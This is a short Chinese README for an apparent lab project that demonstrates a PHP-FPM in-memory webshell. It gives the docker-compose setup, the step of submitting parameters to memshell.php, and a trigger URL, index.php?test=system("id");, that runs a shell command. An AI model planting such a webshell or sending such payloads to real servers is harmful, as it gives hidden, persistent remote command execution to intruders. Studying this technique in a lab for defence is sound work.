# php-fpm-memshell

使用方法

```
docker-compose up -d
```

首先访问memshell.php，设置参数之后submit

<img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220916172144755.png" alt="image-20220916172144755" style="zoom:67%;" />

之后访问`index.php?test=system("id");`即可触发

<img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220916172254753.png" alt="image-20220916172254753" style="zoom:67%;" />

参考环境搭建：
https://github.com/mikechernev/dockerised-php  
https://tttang.com/archive/1720/
